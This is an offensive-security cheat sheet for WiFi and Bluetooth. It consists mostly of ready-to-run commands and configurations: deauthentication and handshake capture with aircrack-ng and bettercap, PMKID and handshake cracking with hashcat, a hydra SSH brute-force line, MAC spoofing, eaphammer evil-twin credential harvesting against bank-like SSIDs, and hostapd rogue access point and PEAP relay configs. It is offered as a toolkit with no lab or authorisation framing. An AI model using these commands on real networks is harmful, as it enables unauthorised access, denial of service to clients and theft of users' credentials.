# WiFi & Wireless

## Wifi 

### Ref 
- <https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee>
- <https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9>
- <https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38>
- <https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d>
- <https://digitalsilence.com/5ghz-electronic-warfare-part-1-attacking-802-11n-networks/>
- <https://digitalsilence.com/bypassing-port-security-in-2018-defeating-macsec-and-802-1x-2010/>

### Tools 

- Airgeddon: <https://github.com/v1s1t0r1sh3r3/airgeddon>
- wifite2 - Attack multiple WEP and WPA encrypted networks at the same time: <https://github.com/derv82/wifite2>
- WIFIPhisher - Phishing attack tool for Wifi networks: <https://github.com/wifiphisher/wifiphisher>
- WiFi Wardriving with Android - WiGLE WiFi Wardriving: <https://play.google.com/store/apps/details?id=net.wigle.wigleandroid&hl=en>
- inSSIDer is a wireless network scanner. It was meant to replace NetStumbler, which was a Microsoft Windows Wi-Fi scanner.
- Network Watcher by NirSoft - displays the list of all computers and devices that are connected to the same network
- 
### Quick Reference 
- `iwconfig`
- interfaces: `iw dev` 
- networks: `iw list` 
- change to monitor mode: `iw dev wlan0 set monitor none`
- deauth: `​aireplay-ng -0 100 -a D2:E9:6A:D3:B3:50 wlan0`
- capture: `airodump-ng wlan0 -c 6` `airodump-ng wlan0 -c 6 -w capture`
- crack: `​aircrack-ng -w wordlists/100-common-passwords.txt capture-01.cap`
- get IP after connecting: `dhclient -v wlan1`
  - ssh: `hydra -t 4 -l root -P /root/wordlists/100-common-passwords.txt ssh://192.105.16.4`
- `iwlist wlan0 scan`
- `nmcli dev wifi`
- `nmcli dev wifi connect AP-SSID password APpassword`
- `airmon-ng start|stop|restart interface`
- `wpa_supplicant -Dnl80211 -iwlan1 -c supplicant.conf`
    ```conf
    network={ 
        ssid="example"
        scan_ssid=1
        key_mgmt=WPA-PSK
        psk="example"
    }
    network={
        ssid="Corporate-A"
        scan_ssid=1
        key_mgmt=WPA-EAP
        eap=PEAP
        identity="bob"
        password="hello"
        phase1="peaplabel=0"
        phase2="auth=MSCHAPV2"
    }
    network={ 
        ssid="Corporate-A"
        scan_ssid=1 
        key_mgmt=WPA-EAP 
        eap=PEAP 
        identity="bob" 
        password="hello" 
        phase1="peaplabel=0" 
        phase2="auth=GTC"
    }
    network={
        ssid="Corporate-A"
        scan_ssid=1 
        key_mgmt=WPA-EAP 
        eap=TTLS
        identity="bob" 
        anonymous_identity="anon" 
        password="hello" 
        phase2="auth=PAP"
    }
    network={ 
        ssid="Corporate-A"
        scan_ssid=1 
        key_mgmt=WPA-EAP 
        eap=TTLS
        identity="bob" 
        anonymous_identity="anon" 
        password="hello" 
        phase2="auth=CHAP"
    }
    network={ 
        ssid="Corporate-A"
        scan_ssid=1 
        key_mgmt=WPA-EAP 
        eap=TTLS
        identity="bob" 
        anonymous_identity="anon" 
        password="hello" 
        phase2="auth=MSCHAPV2"
    }
    network={ 
        ssid="NextGenNetwork" 
        psk="welcome1" 
        key_mgmt=SAE
    }
    network={ 
        ssid="Secure-Public-WiFi" 
        key_mgmt=OWE
    }
    ```
- mac: `macchanger -m D2:E9:6A:D3:B3:51 wlan1`
- Capture and crack handshake:
    ```
    aircrack-ng captured.cap​
    aircrack-ng -a 2 -b <BSSID> -w wordlist captured.cap​
    ```
- WPA/WPA2 PMKID
  - STEP 1:
    - <https://github.com/ZerBea/hcxdumptool>
    - <https://github.com/aircrack-ng/aircrack-ng>
  - STEP 2: Find target BSSID:
    - `airodump-ng --band abg wlan0` `airodump-ng <int>` `airdump-ng wlan0 -c 1`
  - STEP 3: Add BSSID in ‘bssid.txt’ and use ‘hcxdumptool’:
    - `hcxdumptool -i <int> --filterlist=bssid.txt --filermode=2 --enable_status=2 -o pmkid.pcap`
  - STEP 4: Extract PMKID into hashcat format for cracking:
    - <github.com/ZerBea/hcxtools>
    - `hcxpcaptool -z wpa2_pmkid_hash.txt pmkid.pcap`
  - STEP 5: Crack:
    - `hashcat -a 0 -m 16800 -w 4 wpa2_pmkid_hash.txt dict.txt`
  - <https://mobile.twitter.com/netmux/status/1097908867374215168>
- WPA enterprise (evil tween attack)
  - <https://pwn.no0.be/exploitation/wifi/wpa_enterprise/>
  - <https://rootsh3ll.com/evil-twin-attack/>
- 4 way handshake capture:
    ```bash
    sudo bettercap -iface wlan0
    ```
  - this will set the interface in monitor mode and start channel hopping on all supported frequencies: `wifi.recon on`
  - we want our APs sorted by number of clients for this attack, the default sorting would be `rssi asc`: 
    ```bash
    set wifi.show.sort clients desc
    ```
  - every second, clear our view and present an updated list of nearby WiFi networks
    ```bash
    set ticker.commands 'clear; wifi.show'
    ticker on
    ```
  - other
    ```bash
    wifi.recon.channel 1
    ```
    ```bash
    wifi.deauth e0:xx:xx:xx:xx:xx
    ```
- Cracking 4-way handshake:
    ```bash
    /path/to/cap2hccapx /root/bettercap-wifi-handshakes.pcap bettercap-wifi-handshakes.hccapx
    /path/to/hashcat -m2500 -a3 -w3 bettercap-wifi-handshakes.hccapx '?d?d?d?d?d?d?d?d'
    ```
- Client-less **PMKID Attack**
  - <https://hashcat.net/forum/thread-7717.html>
  - PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
    ```bash 
    # wifi.assoc supports 'all' (or `*`) or a specific BSSID, just like wifi.deauth
    wifi.assoc all
    ```
  - All nearby vulnerable routers (and let me reiterate: a lot of them are vulnerable), will start sending you the PMKID, which bettercap will dump to the usual pcap file:
- PMKID Cracking
    ```bash 
    /path/to/hcxpcaptool -z bettercap-wifi-handshakes.pmkid /root/bettercap-wifi-handshakes.pcap
    /path/to/hashcat -m16800 -a3 -w3 bettercap-wifi-handshakes.pmkid '?d?d?d?d?d?d?d?d'
    ```
- Evil Tween
  - `./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid RoyalBank --creds`
  - `./eaphammer -i wlan1 --channel 6 --auth wpa-eap --essid GlobalMarineServices --creds`
- Honeypot (hostapd): `hostapd honeypot.conf`
    ```conf
    interface=wlan1
    hw_mode=g
    channel=6
    driver=nl80211 ssid=XYCompany
    auth_algs=1
    wpa=2 
    wpa_key_mgmt=WPA-PSK 
    wpa_pairwise=CCMP 
    wpa_passphrase=raspberry@1
    ```
    ```conf
    # SSID 1
    interface=wlan1
    driver=nl80211
    ssid=dex-net
    wpa=2
    wpa_passphrase=123456789
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    channel=1

    # SSID 2
    bss=wlan1_0
    ssid=dex-network
    wpa=2
    wpa_passphrase=123456789
    wpa_key_mgmt=WPA-PSK
    rsn_pairwise=CCMP
    channel=1
    ```
    ```conf
    interface=wlan1
    ssid=SecureNetwork
    hw_mode=g
    channel=1
    wpa=2
    wpa_passphrase=thanks@123#
    wpa_key_mgmt=SAE
    rsn_pairwise=CCMP
    ```
    ```conf
    interface=wlan1 
    ssid=SecureNetwork 
    hw_mode=g 
    channel=1
    wpa=2 
    wpa_key_mgmt=OWE 
    rsn_pairwise=CCMP
    ```
    ```conf
    # Evil Twin - WPA Enterprise
    interface=wlan1
    ssid=TigerSecurities
    channel=6
    hw_mode=g
    wpa=3
    wpa_key_mgmt=WPA-EAP
    wpa_pairwise=TKIP CCMP
    auth_algs=3
    ieee8021x=1
    eapol_key_index_workaround=0
    eap_server=1
    eap_user_file=hostapd.eap_user
    ca_cert=/root/certs/ca.pem
    server_cert=/root/certs/server.pem
    ```
    ```conf
    # PEAP relay attack using Hostapd-mana
    interface=wlan0 
    ssid=GlobalCentralBank 
    channel=6
    hw_mode=g
    wpa=3 
    wpa_key_mgmt=WPA-EAP 
    wpa_pairwise=TKIP CCMP
    auth_algs=3
    ieee8021x=1 
    eapol_key_index_workaround=0 
    eap_server=1 
    eap_user_file=hostapd.eap_user 
    ca_cert=/root/certs/ca.pem 
    server_cert=/root/certs/server.pem 
    private_key=/root/certs/server.key 
    private_key_passwd= 
    dh_file=/root/certs/dhparam.pem 
    mana_wpe=1 
    mana_eapsuccess=1 
    enable_mana=1 
    enable_sycophant=1 
    sycophant_dir=/tmp/
    ```
### References

**New References**

- Tracking All the WiFi Things: https://osintcurio.us/2019/01/15/tracking-all-the-wifi-things/
- How to Make a Captive Portal of Death: https://medium.com/bugbountywriteup/how-to-make-a-captive-portal-of-death-48e82a1d81a

## Bluetooth 

### Quick References

- `apt-get install bluez`
- `hciconfig` - similarly to ifconfig
  - `hciconfig hci0 up`
- `hcitool` - provide us with device name, device ID, device class, and device clock information
  - `hcitool scan`
  - `hcitool inq` -  MAC addresses of the devices, the clock offset, and the class of the devices.
    - <https://www.bluetooth.org/en-us/specification/assigned-numbers/service-discovery>
- `hcidump` - sniff the Bluetooth communication
- Service Discovery Protocol (SDP) is a Bluetooth protocol for searching for Bluetooth services (Bluetooth is suite of services),
  - `sdptool browse MACaddress`
- Check reachability: `l2ping MACaddress`